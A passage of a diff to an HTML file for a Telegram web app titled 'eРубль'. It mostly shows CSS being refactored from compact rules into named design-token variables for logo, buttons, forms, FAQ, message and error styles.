@@ -1,150 +1,839 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>eРубль</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* ============================================================
+           ПЕРЕМЕННЫЕ erub.site
+           ============================================================ */
         :root {
-            --bg-dark: #0b102a; --bg-card: #ffffff; --text-primary: #0b102a;
-            --text-secondary: #6b7280; --text-muted: #8a9cbf; --accent: #1e64ff;
-            --accent-hover: #0059ff; --danger: #b91c1c; --success: #00a63e;
-            --border-color: #0b102a1a; --radius: 14px;
+            --color-ink-1000: #001533;
+            --color-ink-900: #0b102a;
+            --color-ink-700: #001f4d;
+            --color-gray-500: #6b7280;
+            --color-gray-400: #8a9cbf;
+            --color-gray-300: #d1d5db;
+            --color-gray-200: #e7e8ea;
+            --color-gray-150: #f0f3f7;
+            --color-gray-100: #f5f5f5;
+            --color-gray-50: #f5f7fa;
+            --color-page-fade: #f4f4f4;
+            --color-section-alt: #f9fafb;
+            --color-white: #fff;
+            --color-blue-700: #0059ff;
+            --color-blue-600: #06f;
+            --color-blue-grad-from: #1e64ff;
+            --color-blue-grad-to: #00cbef;
+            --color-blue-100: #dbeafe;
+            --color-blue-050: #e6f0ff;
+            --color-success-600: #00a63e;
+            --color-success-050: #dcfce7;
+            --color-danger-050: #ffe2e2;
+            --color-border-10: #0b102a1a;
+            --color-glass-white-10: #ffffff1a;
+            --color-glass-white-20: #f6f6f633;
+            --color-glass-border-bright: #ffffffb8;
+            --color-glass-balance-border: #b9bbc247;
+            --color-glass-action-border: #dfe0e375;
+            --color-overlay-strong: #0b102a99;
+            --color-text-primary: var(--color-ink-900);
+            --color-text-secondary: var(--color-gray-500);
+            --color-text-mono: var(--color-gray-400);
+            --color-text-inverse: var(--color-white);
+            --color-text-success: var(--color-success-600);
+            --color-text-accent: var(--color-blue-600);
+            --color-bg-page: var(--color-white);
+            --color-bg-section-alt: var(--color-section-alt);
+            --color-bg-surface: var(--color-white);
+            --color-bg-surface-soft: var(--color-gray-50);
+            --color-bg-surface-muted: var(--color-gray-150);
+            --color-bg-surface-highlight: var(--color-blue-050);
+            --color-bg-glass: var(--color-glass-white-10);
+            --color-bg-glass-strong: var(--color-glass-white-20);
+            --color-bg-chip-dark: var(--color-ink-1000);
+            --color-bg-icon-success: var(--color-success-050);
+            --color-bg-icon-danger: var(--color-danger-050);
+            --color-bg-icon-info: var(--color-blue-100);
+            --color-bg-icon-neutral: var(--color-gray-100);
+            --color-bg-icon-soft: var(--color-gray-50);
+            --color-bg-icon-accent: var(--color-blue-050);
+            --color-border-default: var(--color-border-10);
+            --color-border-strong: var(--color-ink-900);
+            --color-border-accent: var(--color-blue-600);
+            --gradient-cta-primary: linear-gradient(90deg, var(--color-blue-grad-from), var(--color-blue-grad-to));
+            --gradient-cta-dark: linear-gradient(167.91deg, var(--color-ink-900) 0%, var(--color-blue-600) 100%);
+            --gradient-page-wallet: linear-gradient(170deg, #090d22 9.63%, var(--color-blue-600) 33.18%, var(--color-page-fade) 57.72%);
+            --gradient-surface-glass-blue: linear-gradient(112deg, #ffffffe0 0%, #e6f0ffc2 62%, #ffffffe6 100%);
+            --font-sans: "Geologica", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+            --font-mono: ui-monospace, "SF Mono", Consolas, "Liberation Mono", Menlo, monospace;
+            --text-heading-2-size: 36px;
+            --text-heading-2-lh: 40px;
+            --text-heading-3-size: 20px;
+            --text-heading-3-lh: 28px;
+            --text-heading-3-sm-size: 18px;
+            --text-heading-3-sm-lh: 28px;
+            --text-heading-4-size: 16px;
+            --text-heading-4-lh: 24px;
+            --text-body-lg-size: 20px;
+            --text-body-lg-lh: 28px;
+            --text-body-md-size: 16px;
+            --text-body-md-lh: 24px;
+            --text-body-sm-size: 14px;
+            --text-body-sm-lh: 20px;
+            --text-label-md-size: 16px;
+            --text-label-md-lh: 24px;
+            --text-label-cta-size: 18px;
+            --text-label-cta-lh: 28px;
+            --text-label-xs-size: 12px;
+            --text-label-xs-lh: 16px;
+            --fw-extralight: 200;
+            --fw-light: 300;
+            --fw-regular: 400;
+            --fw-medium: 500;
+            --fw-semibold: 600;
+            --fw-bold: 700;
+            --space-1: 4px;
+            --space-2: 8px;
+            --space-3: 12px;
+            --space-4: 16px;
+            --space-6: 24px;
+            --radius-card-sm: 14px;
+            --radius-card-md: 16px;
+            --radius-card-lg: 24px;
+            --radius-pill: 9999px;
+            --border-default: 1px solid var(--color-border-default);
+            --border-strong: 2px solid var(--color-border-strong);
+            --border-accent: 2px solid var(--color-border-accent);
+            --shadow-elevation-1: 0 4px 4px 0 #00000040;
+            --shadow-elevation-blue: 0 24px 80px #0059ff1a, inset 0 1px 0 #ffffffc7;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size-adjust: .48; background: #0b102a; color: var(--text-primary); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; }
-        img, svg { max-width: 100%; display: block; }
-        button { cursor: pointer; font: inherit; color: inherit; background: 0 0; border: 0; padding: 0; }
-        input { font: inherit; color: inherit; }
-        a { color: inherit; text-decoration: none; }
-        h1, h2, h3, h4, h5, h6 { font-size: inherit; font-weight: inherit; }
-        p, h1, h2, h3, h4, h5, h6 { overflow-wrap: break-word; }
 
+        /* ============================================================
+           БАЗА
+           ============================================================ */
+        *,
+        *:before,
+        *:after {
+            box-sizing: border-box;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        html {
+            -webkit-text-size-adjust: 100%;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            min-height: 100svh;
+            font-family: var(--font-sans);
+            font-size-adjust: .48;
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-primary);
+            background: #0b102a;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizelegibility;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        img,
+        picture,
+        video,
+        canvas,
+        svg {
+            max-width: 100%;
+            display: block;
+        }
+        button {
+            cursor: pointer;
+            font: inherit;
+            color: inherit;
+            background: 0 0;
+            border: 0;
+            padding: 0;
+        }
+        input,
+        select,
+        textarea {
+            font: inherit;
+            color: inherit;
+        }
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+        ul,
+        ol {
+            list-style: none;
+        }
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            font-size: inherit;
+            font-weight: inherit;
+        }
+        p,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            overflow-wrap: break-word;
+        }
+
+        /* ============================================================
+           КОНТЕЙНЕР
+           ============================================================ */
         .container {
-            background: var(--bg-card); border-radius: 24px; padding: 24px 16px; width: 100%; max-width: 440px; min-height: 560px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); border: 1px solid var(--border-color);
-            display: flex; flex-direction: column; position: relative; overflow: hidden;
+            background: var(--color-white);
+            border-radius: var(--radius-card-lg);
+            padding: var(--space-6) var(--space-4);
+            width: 100%;
+            max-width: 440px;
+            min-height: 560px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--color-border-default);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
         }
 
-        /* ЛОГО */
-        .logo { text-align: center; margin-bottom: 24px; }
-        .logo h1 { font-size: 36px; line-height: 40px; font-weight: 600; letter-spacing: -0.5px; }
-        .logo h1 span { color: var(--accent); }
-        .logo .sub { color: var(--text-secondary); font-size: 14px; line-height: 20px; margin-top: 4px; font-weight: 400; letter-spacing: 1.5px; text-transform: uppercase; }
+        /* ============================================================
+           ЛОГО
+           ============================================================ */
+        .logo {
+            text-align: center;
+            margin-bottom: var(--space-6);
+        }
+        .logo h1 {
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
+            letter-spacing: -0.5px;
+        }
+        .logo h1 span {
+            color: var(--color-blue-600);
+        }
+        .logo .sub {
+            color: var(--color-text-secondary);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            margin-top: var(--space-1);
+            font-weight: var(--fw-regular);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
 
-        /* БАННЕР */
-        .hero-banner { background: #e6f0ff; border-radius: 14px; padding: 16px; border: 1px solid var(--accent); margin: 4px 0 16px; text-align: center; }
-        .hero-banner h2 { font-size: 20px; line-height: 28px; font-weight: 600; }
-        .hero-banner .highlight { color: var(--accent); }
-        .hero-banner p { color: var(--text-secondary); font-size: 14px; line-height: 20px; margin-top: 4px; }
-        .hero-banner .badge { display: inline-block; background: #dcfce7; color: var(--success); padding: 4px 12px; border-radius: 9999px; font-size: 12px; line-height: 16px; font-weight: 500; margin-top: 8px; border: 1px solid rgba(0, 166, 62, 0.15); }
+        /* ============================================================
+           БАННЕР
+           ============================================================ */
+        .hero-banner {
+            background: var(--color-bg-surface-highlight);
+            border-radius: var(--radius-card-sm);
+            padding: var(--space-4);
+            border: 1px solid var(--color-border-accent);
+            margin: var(--space-1) 0 var(--space-4);
+            text-align: center;
+        }
+        .hero-banner h2 {
+            color: var(--color-text-primary);
+            font-size: var(--text-body-lg-size);
+            line-height: var(--text-body-lg-lh);
+            font-weight: var(--fw-semibold);
+        }
+        .hero-banner .highlight {
+            color: var(--color-blue-600);
+        }
+        .hero-banner p {
+            color: var(--color-text-secondary);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            margin-top: var(--space-1);
+        }
+        .hero-banner .badge {
+            display: inline-block;
+            background: var(--color-bg-icon-success);
+            color: var(--color-text-success);
+            padding: var(--space-1) var(--space-3);
+            border-radius: var(--radius-pill);
+            font-size: var(--text-label-xs-size);
+            line-height: var(--text-label-xs-lh);
+            font-weight: var(--fw-medium);
+            margin-top: var(--space-2);
+            border: 1px solid rgba(0, 166, 62, 0.15);
+        }
 
-        /* МЕНЮ */
-        .menu-grid { display: flex; flex-direction: column; gap: 4px; margin: 8px 0 16px; }
-        .menu-item { padding: 12px 16px; background: #f5f7fa; border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 500; cursor: pointer; transition: background .15s; border: 1px solid transparent; text-align: left; display: flex; align-items: center; gap: 12px; }
-        .menu-item:hover { background: #f0f3f7; border-color: var(--border-color); }
-        .menu-item .icon { width: 24px; height: 24px; flex-shrink: 0; opacity: 0.6; display: flex; align-items: center; justify-content: center; }
-        .menu-item .arrow { margin-left: auto; color: var(--text-muted); font-size: 18px; }
+        /* ============================================================
+           МЕНЮ
+           ============================================================ */
+        .menu-grid {
+            display: flex;
+            flex-direction: column;
+            gap: var(--space-1);
+            margin: var(--space-2) 0 var(--space-4);
+        }
+        .menu-item {
+            padding: var(--space-3) var(--space-4);
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            color: var(--color-text-primary);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s, color .15s;
+            border: 1px solid transparent;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: var(--space-3);
+        }
+        .menu-item:hover {
+            background: var(--color-bg-surface-muted);
+            border-color: var(--color-border-default);
+        }
+        .menu-item .icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            opacity: 0.6;
+        }
+        .menu-item .arrow {
+            margin-left: auto;
+            color: var(--color-text-mono);
+            font-size: 18px;
+        }
 
-        /* КНОПКИ */
-        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(90deg, #1e64ff, #00cbef); color: #fff; border: none; border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 600; cursor: pointer; transition: filter .15s, transform .1s; margin-top: 8px; box-shadow: 0 8px 30px rgba(0, 102, 255, 0.25); }
-        .btn-primary:hover:not(:disabled) { filter: brightness(0.95); transform: translateY(-1px); }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; filter: none !important; }
+        /* ============================================================
+           КНОПКИ (стиль erub)
+           ============================================================ */
+        .btn-primary {
+            width: 100%;
+            padding: var(--space-4);
+            background: var(--gradient-cta-primary);
+            color: var(--color-text-inverse);
+            border: none;
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-label-md-size);
+            line-height: var(--text-label-md-lh);
+            font-weight: var(--fw-semibold);
+            cursor: pointer;
+            transition: filter .15s, transform .1s;
+            margin-top: var(--space-2);
+            box-shadow: 0 8px 30px rgba(0, 102, 255, 0.25);
+        }
+        .btn-primary:hover:not(:disabled) {
+            filter: brightness(0.95);
+            transform: translateY(-1px);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            filter: none !important;
+        }
 
-        .btn-eid { width: 100%; padding: 16px; background: #fff; color: var(--text-primary); border: 2px solid var(--text-primary); border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 500; cursor: pointer; transition: background .15s, color .15s; margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .btn-eid:hover:not(:disabled) { background: var(--text-primary); color: #fff; }
-        .btn-eid:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        .btn-eid {
+            width: 100%;
+            padding: var(--space-4);
+            background: var(--color-white);
+            color: var(--color-text-primary);
+            border: 2px solid var(--color-border-strong);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-label-md-size);
+            line-height: var(--text-label-md-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s, transform .1s, color .15s;
+            margin-top: var(--space-2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-eid:hover:not(:disabled) {
+            background: var(--color-ink-900);
+            color: var(--color-text-inverse);
+        }
+        .btn-eid:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
 
-        .btn-secondary { width: 100%; padding: 12px; background: #f5f7fa; color: var(--text-primary); border: 1px solid var(--border-color); border-radius: 14px; font-size: 16px; line-height: 24px; font-weight: 500; cursor: pointer; transition: background .15s; margin-top: 12px; }
-        .btn-secondary:hover { background: #f0f3f7; }
+        .btn-secondary {
+            width: 100%;
+            padding: var(--space-3);
+            background: var(--color-bg-surface-soft);
+            color: var(--color-text-primary);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s;
+            margin-top: var(--space-3);
+        }
+        .btn-secondary:hover {
+            background: var(--color-bg-surface-muted);
+        }
 
-        .btn-back { width: 100%; padding: 12px; background: transparent; color: var(--text-secondary); border: 1px solid var(--border-color); border-radius: 14px; font-size: 14px; line-height: 20px; font-weight: 500; cursor: pointer; transition: background .15s; margin-top: 12px; }
-        .btn-back:hover { background: #f5f7fa; }
+        .btn-back {
+            width: 100%;
+            padding: var(--space-3);
+            background: transparent;
+            color: var(--color-text-secondary);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s;
+            margin-top: var(--space-3);
+        }
+        .btn-back:hover {
+            background: var(--color-bg-surface-soft);
+        }
 
-        .support-btn { width: 100%; padding: 12px; background: transparent; color: var(--accent); border: 1px solid var(--border-color); border-radius: 14px; font-size: 14px; line-height: 20px; font-weight: 500; cursor: pointer; transition: background .15s, color .15s; margin-top: 12px; }
-        .support-btn:hover { background: #f5f7fa; color: var(--accent-hover); }
+        .support-btn {
+            width: 100%;
+            padding: var(--space-3);
+            background: transparent;
+            color: var(--color-blue-600);
+            border: 1px solid var(--color-border-default);
+            border-radius: var(--radius-card-sm);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            cursor: pointer;
+            transition: background .15s, color .15s;
+            margin-top: var(--space-3);
+        }
+        .support-btn:hover {
+            background: var(--color-bg-surface-soft);
+            color: var(--color-blue-700);
+        }
 
-        /* ФОРМА */
-        .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; font-size: 14px; line-height: 20px; font-weight: 500; color: var(--text-secondary); margin-bottom: 4px; }
-        .form-group input { width: 100%; padding: 12px 16px; border: 1px solid var(--border-color); border-radius: 10px; font-size: 16px; line-height: 24px; transition: border-color .15s, box-shadow .15s; background: #f5f7fa; color: var(--text-primary); }
-        .form-group input::placeholder { color: var(--text-muted); }
-        .form-group input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15); }
-        .form-group input:disabled { opacity: 0.5; cursor: not-allowed; }
+        /* ============================================================
+           ФОРМЫ (стиль erub)
+           ============================================================ */
+        .form-group {
+            margin-bottom: var(--space-4);
+        }
+        .form-group label {
+            display: block;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-1);
+        }
+        .form-group input {
+            width: 100%;
+            padding: var(--space-3) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            border-radius: 10px;
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            transition: border-color .15s, box-shadow .15s;
+            background: var(--color-bg-surface-soft);
+            color: var(--color-text-primary);
+        }
+        .form-group input::placeholder {
+            color: var(--color-text-mono);
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--color-blue-600);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
+        }
+        .form-group input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
 
-        .forgot-link { text-align: right; margin-top: -6px; margin-bottom: 12px; }
-        .forgot-link a { color: var(--text-secondary); font-size: 14px; line-height: 20px; transition: color .15s; cursor: pointer; }
-        .forgot-link a:hover { color: var(--accent); }
+        .forgot-link {
+            text-align: right;
+            margin-top: -6px;
+            margin-bottom: var(--space-3);
+        }
+        .forgot-link a {
+            color: var(--color-text-secondary);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            transition: color .15s;
+        }
+        .forgot-link a:hover {
+            color: var(--color-text-accent);
+        }
 
-        .divider { display: flex; align-items: center; gap: 12px; margin: 16px 0 12px; }
-        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border-color); }
-        .divider span { color: var(--text-muted); font-size: 12px; line-height: 16px; text-transform: uppercase; letter-spacing: 1px; }
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: var(--space-3);
+            margin: var(--space-4) 0 var(--space-3);
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--color-border-default);
+        }
+        .divider span {
+            color: var(--color-text-mono);
+            font-size: var(--text-label-xs-size);
+            line-height: var(--text-label-xs-lh);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
 
-        .register-link { text-align: center; font-size: 14px; line-height: 20px; color: var(--text-secondary); margin-top: 12px; }
-        .register-link a { color: var(--accent); font-weight: 500; cursor: pointer; }
-        .register-link a:hover { text-decoration: underline; }
+        .register-link {
+            text-align: center;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            color: var(--color-text-secondary);
+            margin-top: var(--space-3);
+        }
+        .register-link a {
+            color: var(--color-text-accent);
+            font-weight: var(--fw-medium);
+        }
+        .register-link a:hover {
+            text-decoration: underline;
+        }
 
-        /* СТРАНИЦЫ */
-        .page { display: none; flex-direction: column; animation: fadeIn 0.3s ease; flex: 1; }
-        .page.active { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        /* ============================================================
+           СТРАНИЦЫ
+           ============================================================ */
+        .page {
+            display: none;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+            flex: 1;
+        }
+        .page.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-        .page-title { font-size: 36px; line-height: 40px; font-weight: 600; text-align: center; margin-bottom: 4px; }
-        .page-sub { font-size: 16px; line-height: 24px; color: var(--text-secondary); text-align: center; margin-bottom: 16px; }
-        .page-icon { text-align: center; margin-bottom: 8px; display: flex; justify-content: center; }
-        .page-icon svg { width: 48px; height: 48px; opacity: 0.7; }
+        .page-title {
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
+            text-align: center;
+            margin-bottom: var(--space-1);
+        }
+        .page-sub {
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-secondary);
+            text-align: center;
+            margin-bottom: var(--space-4);
+        }
+        .page-icon {
+            text-align: center;
+            margin-bottom: var(--space-2);
+        }
+        .page-icon svg {
+            width: 48px;
+            height: 48px;
+            opacity: 0.7;
+        }
 
-        /* КОНТЕНТ БЛОКИ */
-        .content-block { background: #f5f7fa; border-radius: 14px; padding: 16px; border: 1px solid var(--border-color); margin-bottom: 12px; }
-        .content-block h3 { font-size: 20px; line-height: 28px; font-weight: 600; margin-bottom: 4px; }
-        .content-block p { font-size: 14px; line-height: 20px; color: var(--text-secondary); }
-        .content-block .num { font-size: 12px; line-height: 16px; font-weight: 600; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
-        .content-block .highlight-text { color: var(--accent); font-weight: 500; }
-        .content-block .green-text { color: var(--success); font-weight: 500; }
+        /* ============================================================
+           КОНТЕНТ БЛОКИ (стиль erub)
+           ============================================================ */
+        .content-block {
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            padding: var(--space-4) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            margin-bottom: var(--space-3);
+        }
+        .content-block h3 {
+            font-size: var(--text-body-lg-size);
+            line-height: var(--text-body-lg-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
+            margin-bottom: var(--space-1);
+        }
+        .content-block p {
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            color: var(--color-text-secondary);
+        }
+        .content-block .num {
+            font-size: var(--text-label-xs-size);
+            line-height: var(--text-label-xs-lh);
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-accent);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: var(--space-1);
+        }
+        .content-block .highlight-text {
+            color: var(--color-text-accent);
+            font-weight: var(--fw-medium);
+        }
+        .content-block .green-text {
+            color: var(--color-text-success);
+            font-weight: var(--fw-medium);
+        }
 
-        /* FAQ */
-        .faq-item { background: #f5f7fa; border-radius: 14px; padding: 12px 16px; border: 1px solid var(--border-color); margin-bottom: 8px; }
-        .faq-item .q { font-weight: 600; font-size: 16px; line-height: 24px; margin-bottom: 4px; }
-        .faq-item .a { font-size: 14px; line-height: 20px; color: var(--text-secondary); }
+        /* ============================================================
+           FAQ
+           ============================================================ */
+        .faq-item {
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            padding: var(--space-3) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            margin-bottom: var(--space-2);
+        }
+        .faq-item .q {
+            font-weight: var(--fw-semibold);
+            color: var(--color-text-primary);
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            margin-bottom: var(--space-1);
+        }
+        .faq-item .a {
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            color: var(--color-text-secondary);
+        }
 
-        /* КОД / ССЫЛКА */
-        .code-section { margin-top: 4px; padding: 16px; background: #f5f7fa; border-radius: 14px; border: 1px solid var(--border-color); }
-        .code-section label { display: block; font-size: 14px; line-height: 20px; font-weight: 500; color: var(--text-secondary); margin-bottom: 8px; }
-        .code-section input { width: 100%; padding: 12px 16px; border: 1px solid var(--border-color); border-radius: 10px; font-size: 16px; line-height: 24px; background: #fff; color: var(--text-primary); transition: border-color .15s, box-shadow .15s; margin-bottom: 12px; }
-        .code-section input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15); }
-        .code-section input::placeholder { color: var(--text-muted); }
-        .code-section input:disabled { opacity: 0.5; cursor: not-allowed; }
+        /* ============================================================
+           КОД / ССЫЛКА
+           ============================================================ */
+        .code-section {
+            margin-top: var(--space-1);
+            padding: var(--space-4) var(--space-4);
+            background: var(--color-bg-surface-soft);
+            border-radius: var(--radius-card-sm);
+            border: 1px solid var(--color-border-default);
+        }
+        .code-section label {
+            display: block;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-2);
+        }
+        .code-section input {
+            width: 100%;
+            padding: var(--space-3) var(--space-4);
+            border: 1px solid var(--color-border-default);
+            border-radius: 10px;
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            background: var(--color-white);
+            color: var(--color-text-primary);
+            transition: border-color .15s, box-shadow .15s;
+            margin-bottom: var(--space-3);
+        }
+        .code-section input:focus {
+            outline: none;
+            border-color: var(--color-blue-600);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
+        }
+        .code-section input::placeholder {
+            color: var(--color-text-mono);
+        }
+        .code-section input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
 
-        /* СООБЩЕНИЯ */
-        .message { margin-top: 16px; padding: 12px 16px; border-radius: 14px; display: none; text-align: center; font-size: 14px; line-height: 20px; font-weight: 500; animation: fadeIn 0.3s ease; }
-        .message.success { display: block; background: #dcfce7; color: var(--success); border: 1px solid rgba(0, 166, 62, 0.15); }
-        .message.error { display: block; background: #ffe2e2; color: #b91c1c; border: 1px solid #f5c6c6; }
-        .message.info { display: block; background: #e6f0ff; color: var(--accent); border: 1px solid rgba(0, 102, 255, 0.15); }
+        /* ============================================================
+           СООБЩЕНИЯ
+           ============================================================ */
+        .message {
+            margin-top: var(--space-4);
+            padding: var(--space-3) var(--space-4);
+            border-radius: var(--radius-card-sm);
+            display: none;
+            text-align: center;
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            font-weight: var(--fw-medium);
+            animation: fadeIn 0.3s ease;
+        }
+        .message.success {
+            display: block;
+            background: var(--color-success-050);
+            color: var(--color-text-success);
+            border: 1px solid rgba(0, 166, 62, 0.15);
+        }
+        .message.error {
+            display: block;
+            background: var(--color-danger-050);
+            color: #b91c1c;
+            border: 1px solid #f5c6c6;
+        }
+        .message.info {
+            display: block;
+            background: var(--color-blue-050);
+            color: var(--color-text-accent);
+            border: 1px solid rgba(0, 102, 255, 0.15);
+        }
 
-        /* СТАТУС ОЖИДАНИЯ */
-        .status-waiting { margin-top: 12px; padding: 12px; background: #e6f0ff; border-radius: 14px; border: 1px solid rgba(0, 102, 255, 0.15); text-align: center; color: var(--accent); font-size: 14px; line-height: 20px; display: none; }
-        .status-waiting .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0, 102, 255, 0.15); border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* ============================================================
+           СТАТУС ОЖИДАНИЯ
+           ============================================================ */
+        .status-waiting {
+            margin-top: var(--space-3);
+            padding: var(--space-3);
+            background: var(--color-blue-050);
+            border-radius: var(--radius-card-sm);
+            border: 1px solid rgba(0, 102, 255, 0.15);
+            text-align: center;
+            color: var(--color-text-accent);
+            font-size: var(--text-body-sm-size);
+            line-height: var(--text-body-sm-lh);
+            display: none;
+        }
+        .status-waiting .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(0, 102, 255, 0.15);
+            border-top: 2px solid var(--color-blue-600);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: var(--space-2);
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-        /* ОШИБКА */
-        .error-block { text-align: center; padding: 16px 0; }
-        .error-block .icon { font-size: 56px; margin-bottom: 12px; color: var(--danger); }
-        .error-block h2 { font-size: 36px; line-height: 40px; color: var(--danger); margin-bottom: 8px; font-weight: 600; }
-        .error-block p { font-size: 16px; line-height: 24px; color: var(--text-secondary); margin-bottom: 16px; }
+        /* ============================================================
+           ОШИБКА
+           ============================================================ */
+        .error-block {
+            text-align: center;
+            padding: var(--space-4) 0;
+        }
+        .error-block .icon {
+            font-size: 56px;
+            margin-bottom: var(--space-3);
+            color: #b91c1c;
+        }
+        .error-block h2 {
+            font-size: var(--text-heading-2-size);
+            line-height: var(--text-heading-2-lh);
+            color: #b91c1c;
+            margin-bottom: var(--space-2);
+            font-weight: var(--fw-semibold);
+        }
+        .error-block p {
+            font-size: var(--text-body-md-size);
+            line-height: var(--text-body-md-lh);
+            color: var(--color-text-secondary);
+            margin-bottom: var(--space-4);
